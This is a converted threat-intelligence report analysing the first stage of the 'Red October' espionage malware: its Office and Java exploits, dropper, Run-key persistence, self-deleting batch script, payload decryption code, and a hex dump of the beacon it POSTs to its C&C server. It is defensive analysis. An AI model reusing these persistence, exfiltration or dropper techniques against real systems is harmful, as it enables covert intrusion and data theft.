{
    "id": "b2d35852-fabb-45c9-ae90-327205213e07",
    "created_at": "2022-10-25T16:48:17.610866Z",
    "updated_at": "2025-03-27T02:06:05.728096Z",
    "deleted_at": null,
    "sha1_hash": "89cfdc989240721e191029bc3636aabaddaa84b8",
    "title": "“Red October”. Detailed Malware Description 1. First Stage of Attack",
    "authors": "",
    "file_creation_date": "2018-12-21T03:30:41Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 607335,
    "plain_text": "# “Red October”. Detailed Malware Description 1. First Stage of Attack\n\n**[securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/)**\n\nBy GReAT\n\n**First stage of attack**\n\n1. [Exploits](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#exploits)\n2. [Dropper](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#dropper)\n3. [Loader Module](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#loader)\n4. [Main component](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#main-component)\n\n**Second stage of attack**\n\n1. [Modules, general overview](https://securelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/)\n2. [Recon group](https://securelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/)\n3. [Password group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n4. [Email group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n5. [USB drive group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n6. [Keyboard group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n7. [Persistence group](https://securelist.com/red-october-detailed-malware-description-4-second-stage-of-attack/36884/)\n8. [Spreading group](https://securelist.com/red-october-detailed-malware-description-4-second-stage-of-attack/36884/)\n9. [Mobile group](https://securelist.com/red-october-detailed-malware-description-5-second-stage-of-attack/36879/)\n10. [Exfiltration group](https://securelist.com/red-october-detailed-malware-description-5-second-stage-of-attack/36879/)\n\n## Exploits\n\nBased on the analysis of known cases, we identified two main ways through which\nBackdoor.Win32.Sputnik infects the victims. Both methods rely on spear-phishing e-mails\nwhich are sent to the prospective victims. The e-mails contain an attachment which is\neither an Excel or Word document, with enticing names. In addition to Office documents\n(CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it appears that the attackers also\ninfiltrated victim network(s) via Java exploitation\n(MD5:35f1572eb7759cb7a66ca459c093e8a1 – ‘NewsFinder.jar’), known as the ‘Rhino’\nexploit (CVE-2011-3544).\n\n\n-----\n\n_The Red October infection diagram_\n\n### The Excel-based exploit – CVE-2009-3129\n\nThis is the oldest known way for Red October to infect computers.\n\nA list of some of the Excel file names can be found below:\n\n**File name:** **MD5:**\n\nKatyn_-_opinia_Rosjan.xls bd05475a538c996cd6cafe72f3a98fae\n\nWORK PLAN (APRIL-JUNE 2011).xls f16785fc3650490604ab635303e61de2\n\nEEAS-Staff New contact list (05-25-2011).xls 5f9b7a70ca665a54f8879a6a16f6adde\n\n\ntactlist_05-05-2011_.8634.xls\nEEAS New contact list (05-05-2011).xls\n\n\nbb2f6240402f765a9d0d650b79cd2560\n\n\nAgenda Telefoane institutii si ministere 2011.xls 4bfa449f1a351210d3c5b03ac2bd18b1\n\nAgenda Telefoane institutii si ministere 2011 (2).xls 4ce5fd18b1d3f551a098bb26d8347ffb\n\n\n-----\n\nspisok sotrudnikov.xls d98378db4016404ac558f9733e906b2b\n\nList of shahids.xls dc4a977eaa2b62ad7785b46b40c61281\n\nSpravochnik.xls 5ecec03853616e13475ac20a0ef987b6\n\n\nAgenda Telefoane&Email institutii si ministere\n2011.xls\n\n\nde56229f497bf51274280ef84277ea54\n\n\nEEAS New contact list (05-05-2011) (2).xls 396d9e339c1fd2e787d885a688d5c646\n\nFIEO contacts update.xls 7e5d9b496306b558ba04e5a4c5638f9f\n\nTelephone.xls c42627a677e0a6244b84aa977fbea15d\n\nList of shahids.xls 1f86299628bed519718478739b0e4b0c\n\nBMAC Attache List – At 11 Oct_v1[1].XLS f0357f969fbaf798095b43c9e7a0cfa7\n\nMERCOSUR_Imports.xls 50bd553568422cf547539dd1f49dd80d\n\nCópia de guia de telefonos (2).xls cee7bd726bc57e601c85203c5767293c\n\nProgramme de fetes 2011.xls ceac9d75b8920323477e8a4acdae2803\n\n12 05 2011 updated.xls 639760784b3e26c1fe619e5df7d0f674\n\ntelefonebi.xls d71a9d26d4bb3b0ed189c79cd24d179a\n\ntelefonebi.xls dc8f0d4ecda437c3f870cd17d010a3f6\n\nThe Excel based exploit is detected by Kaspersky products as TrojanDropper.MSWord.Agent.ga. It was apparently used mostly in 2011, with several samples\nbeing uploaded to VirusTotal by the victims. For a detection link of various products, check:\n\nhttps://www.virustotal.com/file/afaebb8055559ea6bf88cedcd6fc7b93f02cde31a560876bcc\n4860fd0686739d/analysis/\n\nSeveral detections include:\n\nKaspersky Trojan-Dropper.MSWord.Agent.ga 20120808\n\nMcAfee Exploit-MSExcel.u 20120808\n\nMicrosoft Exploit:Win32/CVE-2009-3129 20120808\n\nSymantec Bloodhound.Exploit.306 20120808\n\nTrendMicro HEUR_OLEXP.B 20120808\n\nThe Excel file properties for all the exploits indicate it has been edited on a system with\nSimplified Chinese Excel. The exploit appears to have been compiled on 26 Nov 2009:\n\nEXIF METADATA\n=============\nMIMEType : application/vnd.ms-excel\nCompany :\nModifyDate: 2009:11:26 03:35:15\n\n\n-----\n\nAuthor:\nCodePage : Windows Simplified Chinese (PRC, Singapore)\nTitle :\nAppVersion: 11.9999\nLinksUpToDate : No\nScaleCrop : No\nLastModifiedBy: qq\nHeadingPairs : ??????, 1\nHyperlinksChanged : No\nCreateDate: 1996:12:17 01:32:42\nSecurity : None\nFileType : XLS\nSoftware : Microsoft Excel\n\nThe exact exploit type used by Red October in the XLS files is CVE-2009-3129.\n\n#### Exploit (CVE-2009-3129) information:\n\n_“Microsoft Office Excel 2002 SP3, 2003 SP3, and 2007 SP1 and SP2; Office 2004 and 2008_\n_for Mac; Open XML File Format Converter for Mac; Office Excel Viewer 2003 SP3; Office_\n_Excel Viewer SP1 and SP2; and Office Compatibility Pack for Word, Excel, and PowerPoint_\n_2007 File Formats SP1 and SP2 allows remote attackers to execute arbitrary code via a_\n_spreadsheet with a FEATHEADER record containing an invalid cbHdrData size element that_\n_affects a pointer offset, aka “Excel Featheader Record Memory Corruption Vulnerability.”_\n\n[US-CERT info: https://www.us-cert.gov/cas/techalerts/TA09-314A.html](https://www.us-cert.gov/cas/techalerts/TA09-314A.html)\n[Patch: http://technet.microsoft.com/en-us/security/bulletin/ms09-nov](http://technet.microsoft.com/en-us/security/bulletin/ms09-nov)\n\nThe vulnerability exploited by the Red October XLS dropper has been patched by Microsoft\nin November 2009.\n\n#### The CVE-2009-3129 exploit and shellcode\n\n_Shellcode decryptor in XLS files_\n\nThe Red October XLS CVE-2009-3129 exploit appears to have been originally developed by\nChinese hackers. It was also used in other, unrelated attacks against Tibetan activists and\nother entities. Its main purpose is to drop and execute a Trojan, which for Red October is in\nthe range of 500-600kB.\n\n\n-----\n\nproceeds to decrypt itself. Once decrypted, the shellcode in turn decrypts the main\nmalware body (at offset 0x6600 in the XLS files).\n\nThe malware is stored in the Excel file at offset 0x6600, in encrypted form:\n\n_Encrypted malware payload in XLS files_\n\nThe malware is encrypted with a simple XOR+ROR algorithm:\n\nvoid decrypt(unsigned char *tbuf, unsigned long n, int round) {\nunsigned char b;\nlong i;\nunsigned short ecx=0x400;\nunsigned char a;\na=6;\nfor (i=0;i<1024;i++) {\nb=tbuf[i];\nb=b^ecx;\nb = (b>>a) | (b< tbuf[i]=b;\necx--;\n}\n}\n\nThe shellcode writes the main “top” Trojan dropper to a file named “Dcs.tmp” and runs it. It\nwill also extract a dummy Excel file which will be shown to the user if the exploit was\nsuccessful. The dummy Excel is named “~ .xls”.\n\n### The Word-based exploit – CVE-2010-3333\n\nThe CVE-2010-3333 Word-based exploit (RTF files) has been observed in September and\nOctober 2012. Example filename / MD5 list related to the attack:\n\n\n-----\n\n**arexeio1.doc** cb51ef3e541e060f0c56ac10adef37c3\n\n**Popa Tatiana -plîngere.doc** 6B23732895DAAAD4BD6EAE1D0B0FEF08\n\n\n**La Política de Defensa y el Poder Naval en México**\n**OTAN (1).doc**\n\n**Iran, Syria and the balance of power in the Middle**\n**East.doc**\n\n\n44E70BCE66CDAC5DC06D5C0D6780BA45\n\n9F470A4B0F9827D0D3AE463F44B227DB\n\n\n**Diplomatic Staff list.doc** 91EBC2B587A14EC914DD74F4CFB8DD0F\n\n**Diplomatic Car for Sale – MB 2000.doc** 85BAEBED3D22FA63CE91FFAFCD7CC991\n\n\n**Rulers have hostaged parliament to further their**\n**personal interest (1).doc**\n\n\nB9238737D22A059FF8DA903FBC69C352\n\n\n**Итоги президенства В.Януковича.doc** 2672FBBA23BF4F5E139B10CACC837E9F\n\n**the wife of Ambassador-2.doc** 65D277AF039004146061FF01BB757A8F\n\n**Вожможные стратегические решения.doc** 731C68D2335E60107DF2F5AF18B9F4C9\n\n**31086823_cm04639-re02 en12.doc** 9B55887B3E0C7F1E41D1ABDC32667A93\n\n**16 октября 2012 года (дополнение).doc** A7330CE1B0F89AC157E335DA825B22C7\n\n**delegat.doc** FC3C874BDAEDF731439BBE28FC2E6BBE\n\n**Davos2011_follow-up plan_heregjilt.doc** 9950A027191C4930909CA23608D464CC\n\n**Participant list 6th Forum 09-12 update.doc** C78253AEFCB35F94ACC63585D7BFB176\n\n\n**Draft 3_Conference Renewable energy cooperation and**\n**Grid integration.doc**\n\n\n5D1121EAC9021B5B01570FB58E7D4622\n\n\nThe Word based exploit is detected by Kaspersky products as Exploit.MSWord.CVE-20103333.bw. It was apparently used mostly in 2012 (eg. October 2012), with one sample being\nuploaded to VirusTotal, probably by one of the victims. For a detection link of various\nproducts, check:\n\nhttps://www.virustotal.com/file/5fe53a960bc2031a185c575ea05ac466f26739a34c651c142\n60e4cfbc123e87f/analysis/\n\nSeveral detections include:\n\nKaspersky Exploit.MSWord.CVE-2010-3333.bw 20121012\n\nMcAfee – 20121012\n\nMicrosoft Exploit:Win32/CVE-2010-3333 20121012\n\nSymantec – 20121012\n\nTrendMicro – 20121012\n\nThe dropper is in fact an RTF file, with “author John Doe”, supposedly created by\n“mocrosoft office word Msfedit 5.1.21.2500”.\n\n\n-----\n\nThe exact exploit type used by Red October in these RTF files is CVE-2010-3333.\n\n#### Exploit (CVE-2010-3333) information:\n\n_“Stack-based buffer overflow in Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2,_\n_Office 2010, Office 2004 and 2008 for Mac, Office for Mac 2011, and Open XML File Format_\n_Converter for Mac allows remote attackers to execute arbitrary code via crafted RTF data,_\n_aka “RTF Stack Buffer Overflow Vulnerability.”_\n\n[MITRE: http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3333](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3333)\n[CERT: http://www.us-cert.gov/cas/techalerts/TA10-313A.html](http://www.us-cert.gov/cas/techalerts/TA10-313A.html)\n[Microsoft: http://technet.microsoft.com/en-us/security/bulletin/ms10-nov](http://technet.microsoft.com/en-us/security/bulletin/ms10-nov)\n\nThe vulnerability exploited by Red October’s RTF documents was patched by Microsoft in\nNovember 2010.\n\n#### The CVE-2010-3333 exploit and shellcode\n\nThe RTF file acts as a dropper for the main Trojan body. It also contains a fake document\nwhich is shown to the user in case the exploit is successful.\n\n_Encrypted trojan body inside RTF files_\n\nThe main Trojan body is encrypted “XOR 0xFB” and stored as hex text inside the RTF file.\nThe shellcode decrypts the main body and executes it.\n\n### The Word-based exploit – CVE-2012-0158\n\nIn November 2012 we’ve noticed new attacks using document files that exploit CVE-20120158. This exploit has been extremely popular with APT attacks during 2012 so it’s perhaps\n\ni it l d t d b th R d O t b\n\n\n-----\n\n**File name:** **MD5:**\n\nMazda.doc 93d0222c8c7b57d38931cfd712523c67\n\nKomorowski.doc 51edea56c1e83bcbc9f873168e2370af\n\n\nCommercial Report for\nOctober.doc\n\n\n114ed0e5298149fc69f6e41566e3717a\n\n\nRussian terrorist attack.doc 350c170870e42dce1715a188ca20d73b\n\nFLOC-meeting.doc 4daa2e7d3ac1a5c6b81a92f4a9ac21f1\n\n3037.doc 82e518fb3a6749903c8dc17287cebbf8\n\n8th_2012 Minutes of meeting.doc 3ded9a0dd566215f04e05340ccf20e0c\n\nThe CVE-2012-0158 exploit used in these attacks is mostly undetected by antivirus\nproducts at the time of writing of this report. Kaspersky Lab products catch and block the\nexploit using the state of the art “Automatic Exploit Prevention” technology.\n\nThe same exploit / dropper have been observed in many other targeted attacks against for\ninstance Tibetan activists. It appears to be of Chinese origin just as the other exploits.\n\nThe exact exploit type used by Red October in these RTF files is CVE-2012-0158.\n\n#### Exploit (CVE-2012-0158) information:\n\n_“The (1) ListView, (2) ListView2, (3) TreeView, and (4) TreeView2 ActiveX controls in_\n_MSCOMCTL.OCX in the Common Controls in Microsoft Office 2003 SP3, 2007 SP2 and SP3,_\n_and 2010 Gold and SP1; Office 2003 Web Components SP3; SQL Server 2000 SP4, 2005 SP4,_\n_and 2008 SP2, SP3, and R2; BizTalk Server 2002 SP1; Commerce Server 2002 SP4, 2007 SP2,_\n_and 2009 Gold and R2; Visual FoxPro 8.0 SP1 and 9.0 SP2; and Visual Basic 6.0 Runtime_\n_allow remote attackers to execute arbitrary code via a crafted (a) web site, (b) Office_\n_document, or (c) .rtf file that triggers “system state” corruption, as exploited in the wild in_\n_April 2012, aka “MSCOMCTL.OCX RCE Vulnerability.””_\n\n[NIST: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0158](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0158)\n[Microsoft: http://technet.microsoft.com/en-us/security/bulletin/ms12-027](http://technet.microsoft.com/en-us/security/bulletin/ms12-027)\n\nThe vulnerability exploited by these Red October RTF documents was patched by Microsoft\nin April 2012.\n\n#### The CVE-2012-0158 exploit and shellcode\n\nThe RTF file acts as a dropper for the main Trojan body. It also contains a fake document\nwhich is shown to the user in case the exploit is successful.\n\n\n-----\n\n_Encrypted Trojan dropper body in RTF files with CVE-2012-0158_\n\nThe main Trojan body is encrypted “XOR 0xDE” and stored as hex text inside the RTF file.\nThe shellcode simply writes the main dropper to a file named “msmx21.exe” in the\n%TEMP% folder and runs it. It also extracts a fake document which is shown to the victim\nif the exploit has been successful.\n\n\n-----\n\n_Fake document shown to the victim if exploit is successful_\n\n### The Java based exploit – CVE-2011-3544\n\nSince the publication of our initial report, our colleagues from Seculert have discovered the\nusage of another delivery vector in the Red October attacks.\n\nIn addition to Office documents (CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it\nappears that the attackers also infiltrated victim network(s) via Java exploitation\n(MD5:35f1572eb7759cb7a66ca459c093e8a1 – ‘NewsFinder.jar’), known as the ‘Rhino’\nexploit (CVE-2011-3544).\n\nWe know the early February 2012 timeframe that they would have used this technique, and\nthis exploit use is consistent with their approach in that it’s not 0-day. Most likely, a link to\nthe site was emailed to potential victims, and the victim systems were running an outdated\nversion of Java.\n\n\n-----\n\nthe php responsible for serving the ‘.jar’ malcode archive, the line of code delivering the java\nexploit was commented out. Also, the related links, java, and the executable payload are\nproving difficult to track down to this point.\n\nThe domain involved in the attack is presented only once in a public sandbox at malwr.com\n[(http://malwr.com/analysis/c3b0d1403ba35c3aba8f4529f43fb300/), and only on February](http://malwr.com/analysis/c3b0d1403ba35c3aba8f4529f43fb300/)\n14th, the very same day that they registered the domain hotinfonews.com:\n\nDomain Name: HOTINFONEWS.COM\nRegistrant:\nPrivat Person\nDenis Gozolov (gozolov@mail.ru)\nNarva mnt 27\nTallinn\nTallinn,10120\nEE\nTel. +372.54055298\nCreation Date: 14-Feb-2012\nExpiration Date: 14-Feb-2013\n\nFollowing that quick public disclosure, related MD5s and links do not show up in public or\nprivate repositories, unlike the many other Red October components.\n\nWe could speculate that the group successfully delivered their malware payload to the\nappropriate target(s) for a few days, then didn’t need the effort any longer. Which may also\ntell us that this group, which meticulously adapted and developed their infiltration and\ncollection toolset to their victims’ environment, had a need to shift to Java from their usual\nspearphishing techniques in early February 2012. And then they went back to their spear\nphishing.\n\nAlso of note, there was a log recording three separate victim systems behind an IP address\nin the US, each connecting with a governmental economic research institute in the Middle\nEast.\n\nSo, this Java Rhino exploit appears to be of limited use. And, the functionality embedded on\nthe server side PHP script that delivers this file is very different from the common and\nrelated functionality that we see in the backdoors used throughout the five year campaign.\n\nThe crypto routines maintained and delivered within the exploit itself are configured such\nthat the key used to decrypt the URL strings within the exploit is delivered within the Java\napplet itself. Here is our PHP encryption routine to encrypt the Url for the downloader\ncontent:\n\n\n-----\n\nAnd this is the function to embed the applet in the HTML, passing the encrypted URL string\nthrough parameter ‘p’:\n\nHere is the code within the applet that consumes the encrypted strings and uses it. The\nresulting functionality downloads the file from the URL and writes it to ‘javaln.exe’. Notice\nthat the strb and stra variables maintain the same strings as the $files and $charset\nvariables in the php script:\n\nThis “transfer” decryption routine returns a URL that is concatenated with the other\nvariables, resulting in”hXXp://www.hotinfonews.com/news/dailynews2.php?id=&t=win”. It\nis this content that is written to disk and executed on the victim’s machine. A description of\nthat downloader follows. It is most interesting that this exploit/php combination’s\nencryption routine is different from the obfuscation commonly used throughout Red\nOctober modules. It further suggests that potentially this limited use package was\ndeveloped separately from the rest for a specific target.\n\n#### 2nd stage of the Java exploit attack: EXE, downloader\n\nThe second stage of the attack is downloaded from\n“http://www.hotinfonews.com/news/dailynews2.php”and executed by the payload of the\nJava exploit. It acts as a downloader for the next stage of the attack.\n\n\n-----\n\nMD5: c3b0d1403ba35c3aba8f4529f43fb300\n\nThe file is a PE EXE file, compiled with Microsoft Visual Studio 2008 on 2012.02.06. The file\nis protected by an obfuscation layer, the same as used in many Red October modules.\n\n_Obfuscation layer disassembled_\n\nThe module creates a mutex named “MtxJavaUpdateSln” and exits if it already exists.\n\nAfter that, it sleeps for 79 seconds and then creates one of the following registry values to\nbe loaded automatically on startup:\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\nJavaUpdateSln=%full path to own executable%\n\n[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\nJavaUpdateSln=%full path to own executable%\nThen, after a 49 second delay, it enters an infinite loop waiting for a working Internet\nconnection. Every 67 seconds it sends a HTTP POST request to the following sites:\n\n**www.microsoft.com**\n**update.microsoft.com**\n**www.google.com**\n\nOnce a valid connection is established, it continues to its main loop.\n\n#### C&C server connection loop\n\n\n-----\n\nThe request is sent to a hardcoded URL: www.dailyinfonews.net/reportdatas.php\n\nThe contents of the post request follow the following format:\n\n_id=%unique user ID, retrieved from the overlay of the file%&_\n_A=%integer, indicates whether the autorun registry key was written%&_\n_B=%0 or 1, indicates if user has administrative rights%&_\n_C=%integer, level of privilege assigned to the current user%_\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n00000000 50 4f 53 54 20 68 74 74 70 3a 2f 2f 77 77 77 2e |POST http://www.|\n00000010 64 61 69 6c 79 69 6e 66 6f 6e 65 77 73 2e 6e 65 |dailyinfonews.ne|\n00000020 74 3a 38 30 2f 72 65 70 6f 72 74 64 61 74 61 73 |t:80/reportdatas|\n00000030 2e 70 68 70 20 48 54 54 50 2f 31 2e 30 0d 0a 48 |.php HTTP/1.0..H|\n00000040 6f 73 74 3a 20 77 77 77 2e 64 61 69 6c 79 69 6e |ost: www.dailyin|\n00000050 66 6f 6e 65 77 73 2e 6e 65 74 3a 38 30 0d 0a 43 |fonews.net:80..C|\n00000060 6f 6e 74 65 6e 74 2d 6c 65 6e 67 74 68 3a 20 36 |ontent-length: 6|\n00000070 32 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a |2..Content-Type:|\n00000080 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 | application/x-w|\n00000090 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 |ww-form-urlencod|\n000000a0 65 64 0d 0a 0d 0a 69 64 3d 41 41 41 39 33 39 35 |ed....id=AAA9395|\n000000b0 37 35 32 39 35 33 31 32 35 30 35 31 34 30 32 36 |7529531250514026|\n000000c0 31 30 30 36 43 43 43 39 33 33 30 30 39 42 42 42 |1006CCC933009BBB|\n000000d0 31 36 35 34 31 35 31 33 26 41 3d 31 26 42 3d 31 |16541513&amp;A=1&amp;B=1|\n000000e0 26 43 3d 32                    |&amp;C=2|\n\n\n_HTTP POST request sent to the C&C server_\n\nThe module decrypts the C&C response with AMPRNG algorithm using a hardcoded key.\nThen, it checks if there is a valid EXE signature (“MZ”) at offset 37 in the decrypted buffer.\nIf the signature is present, it writes the EXE file to “%TEMP%\\nvsvc%p%p.exe” (%p depends\non system time) and executes it.\n\n#### 3rd stage of the Java exploit attack: EXE, unknown\n\nCurrently, the C&C server is unavailable and we do not have the executables that were\nserved to the “javaln.exe” downloader. Most likely, they were the actual droppers, similar to\nthe ones used with Word and Excel exploits .\n\n## Dropper\n\nThe dropper module is a PE EXE file, compiled with Microsoft Visual Studio 2008. It is\nextracted and executed by one of the exploits used to deliver the malware to the victim.\n\nKnown variants drop and execute the “loader” component named “svchost.exe” or\n“svclogon.exe” and one encrypted main component file (see description of the “loader”\ncomponent).\n\n### Main function\n\n#### Registry key check\n\n\n-----\n\ndirectory path and the serial number of the system drive.\n\nThen, it tries to read the default value of the registry key:\n\nHKLM\\Software\\Classes\\CLSID\\generated_CLSID (if it has administrative rights)\nHKCU\\Software\\Classes\\CLSID\\generated_CLSID (if it has no administrative rights)\n\nIt checks the contents of the default key value. This check succeeds if the registry key is\nnot present or its value is equal to the last DWORD of the file’s SHA1 checksum. Otherwise\nthe check fails and it runs the check again each 3 milliseconds for 4294967294 times.\n\nThen, it sets the default value of the registry key to the hexadecimal representation of the\nvalue of the last SHA1’s DWORD and tries to read the registry value “InfoTip” from the same\nregistry key. The registry value is assumed to be a 48-byte binary buffer. It extracts a time\nparameter from that buffer and self-deletes if the difference between the recorded time\nand current time is less than 3 days.\n\nThis means that the updated modules can be delivered not sooner than in three days to the\nsame victim. If someone tries to reinfect the system with the same dropper, it refuses to do\nso within 3 days from last infection. This can also be a mechanism to escape from\nattention of power users or administrators who can run recently opened suspicious\napplication again and monitor its activity.\n\nThis check is identical to the one implemented in the “loader” module.\n\n### Installation routine\n\nThe module retrieves its resource of type “AAA” and name “000”. The resource is then\ndecrypted using a custom RC4-like cipher with a hardcoded key.\n\n**Offset** **Type** **Description**\n\n**0** DWORD If equal to “1”, the dropper should self-delete and exit after processing the resource\n\n**4** DWORD If equal to “1”, the dropper should exit after processing the resource\n\n**8** DWORD Delay in milliseconds before processing the resource\n\nThe resource header is followed by data entries each containing one file.\n\n**Offset** **Type** **Description**\n\n**0** DWORD Record type\n\n**4** DWORD Size of the file name in\nbytes\n\n**8** DWORD Size of the file contents\n\n**12** DWORD Reserved, equal to 0x7D4\n\n**16** BYTE[] File name, Unicode\n\n**16 + size of the file name** BYTE[] File contents\n\n\n-----\n\n**Record type** **Action**\n\n**0x07** Write the file to disk\n\n**0x08** Write the file to disk and execute immediately with CreateProcess() API\n\n\n**0x09**\n**0x0A**\n**0x0D**\n**0x0E**\n\n**0x0B**\n**0x0C**\n\n\nWrite to predefined directory:\n%System Directory%\\wmispoold\\%file name% (if has administrative rights)\n%APPDATA%\\wmispoold\\%file name% (if has user only rights)\n0x09 – create new file and write to it\n0x0A – create new file, write and execute it\n0x0D – overwrite file\n0x0E – overwrite and execute file\nTries to terminate any running process that belongs to the file being\n(over)written.\n\nWrite to the first available directory from the hardcoded list (see below)\n0x0B – write file\n0x0C – write and execute file\n\n\nThe module sets file creation/modification time equal to the one of the\n“%windir%\\system32\\kernel32.dll” file.\n\nFor record types 0x0B and 0x0C, the module tries to write the file to the first available\ndirectory from the list:\n\n%ProgramFiles%\\Windows NT\\\n%APPDATA%\\Microsoft\\\n%ProgramFiles%\\Windows NT\\Accessories\\\n%ProgramFiles%\\Windows NT\\Pinball\\\n%ProgramFiles%\\Windows Media Player\\\n%ProgramFiles%\\Web Publish\\\n%ProgramFiles%\\Outlook Express\\\n%ProgramFiles%\\Microsoft Office\\Office10\\Data\\\n%ProgramFiles%\\Microsoft Office\\Office10\\\n%ProgramFiles%\\Microsoft Frontpage\\\n%ProgramFiles%\\Internet Explorer\\\n%ProgramFiles%\\ComPlus Applications\\\n%ProgramFiles%\\WindowsUpdate\\\n%CommonProgramFiles%\\Microsoft Shared\\MsInfo\\\n%CommonProgramFiles%\\Microsoft Shared\\Office10\\\n%CommonProgramFiles%\\Proof\\\n%CommonProgramFiles%\\Web Folders\\\n%CommonProgramFiles%\\Web Server Extensions\\\n%CommonProgramFiles%\\System\\ado\\\n%CommonProgramFiles%\\System\\msadc\\\n%SystemDrive%\\Documents and Settings\\LocalService\\Application Data\\Microsoft\\\n%SystemDrive%\\Documents and Settings\\LocalService\\Local Settings\\Application\nData\\Microsoft\\\n%ALLUSERSPROFILE%\\Application Data\\\n\n\n-----\n\n%windir%\\Help\\Tours\\htmTour\\\n%windir%\\Help\\Tours\\WindowsMediaPlayer\\\n%windir%\\IME\\\n%windir%\\MsApps\\\n%windir%\\MsApps\\MsInfo\\\n%windir%\\inf\\\n%ALLUSERSPROFILE%\\Application Data\\Microsoft\\\n%ALLUSERSPROFILE%\\Application Data\\Microsoft\\Office\\\n%ALLUSERSPROFILE%\\Application Data\\Microsoft\\Office\\Data\\\n%ALLUSERSPROFILE%\\Application Data\\Microsoft\\Windows\\\n%HOMEPATH%\\Local Settings\\\n%APPDATA%\\\n%APPDATA%\\Microsoft\\Office\\\n%APPDATA%\\Microsoft\\Office\\Data\\\n%APPDATA%\\Microsoft\\Windows\\\n%windir%\\Temp\\\n%TMP%\\\n%TEMP%\\\n\n### Post processing\n\nThe module deletes the following registry keys:\n\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Resiliency\\StartupItems\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Resiliency\\DisabledItems\n\nThis is done to erase the list of Microsoft Word documents that might need recovery,\nprobably to avoid showing up the document with exploit again if it crashed Microsoft Word\nprocess.\n\n### Self removal procedure\n\nThe dropper creates a file “%TEMP%\\msc.bat”, executes it and exits, effectively selfdeleting its body:\n\nchcp 1251\n:Repeat\nattrib -a -s -h -r \"%path to own executable file%\"\ndel \"%path to own executable file%\"\nif exist \"%path to own executable file%\" goto Repeat\ndel \"%path to own executable file%\"\n\n_Contents of the “msc.bat” file_\n\n#### Known variants\n\n**MD5** **Compilation date (source)** **Compilation date**\n**(** **l** **d)**\n\n\n-----\n\n(GMT) (GMT)\n\n\n**418B7A888484BDCBBA3B431ACC57B6AB** 2011.09.22 04:52:59\n(GMT)\n\n**5C23DBF7B2BED5D54EADC47889EE1038** 2011.06.23 09:53:26\n(GMT)\n\n**EA2765A3D9F865EF7546BA7F5F145E95** 2011.06.30 08:26:29\n(GMT)\n\n**4A5F5C6E1AD30CF2799E3EA13468B3C2** 2011.07.07 09:27:34\n(GMT)\n\n**A03CCD50DB47361E6BD9B05017372110** 2011.04.21 10:47:12\n(GMT)\n\n**FA28873EFD2279E9AF79202E9A7E9398** 2011.08.16 06:31:24\n(GMT)\n\n**4ACE8A18C8710B40FF9B47F29F82EAC7** 2011.08.18 06:21:22\n(GMT)\n\n**204F7BFA78ED99E623DEF43BA0A188C9** 2011.07.20 13:04:53\n(GMT)\n\n**35061250A7C580A4CEA31F29E050C4FF** 2011.03.14 14:46:51\n(GMT)\n\n**58C5D4158DF279E9038344D0B420BEDE** 2011.03.14 14:58:56\n(GMT)\n\n**24546BB958EDD449408BA1AADDB3DCEB** 2011.03.04 11:46:39\n(GMT)\n\n**2541C266893A45F393112C6F15C2A0C7** 2011.01.13 07:59:02\n(GMT)\n\n**B0D190A48E749B2688E7A90CE3926E84** 2011.03.09 08:58:07\n(GMT)\n\n**3E35C7C39BC71BADFE9AD15752C2DDDE** 2012.09.06 10:30:38\n(GMT)\n\n**EBCCD9FC831B168D872F6556B4A42DAC** 2011.03.15 08:33:11\n(GMT)\n\n**7AAC26EA551EC67882E14C388E436F10** 2011.03.15 09:06:51\n(GMT)\n\n**5F1D10F7CA9E1B9C301872B1BC4B8A18** 2011.05.06 07:58:13\n(GMT)\n\n**812FC1780548F0611E3F4105E48E518A** 2011.05.26 11:04:38\n(GMT)\n\n**DC0A5753F9885D0BA71ECEA767F91564** 2011.07.20 11:06:28\n(GMT)\n\n**D44966B31FC6BAFF97AE23EA53A6DFF0** 2011.10.06 14:05:34\n(GMT)\n\n**141DC8FD84D985F792DE9747F63C6A4C** 2011.03.14 15:00:23\n(GMT)\n\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n2011.03.02 09:45:07\n(GMT)\n\n2010.10.11 14:14:34\n(GMT)\n\n2011.03.03 12:50:46\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 07:43:59\n(GMT)\n\n2011.03.15 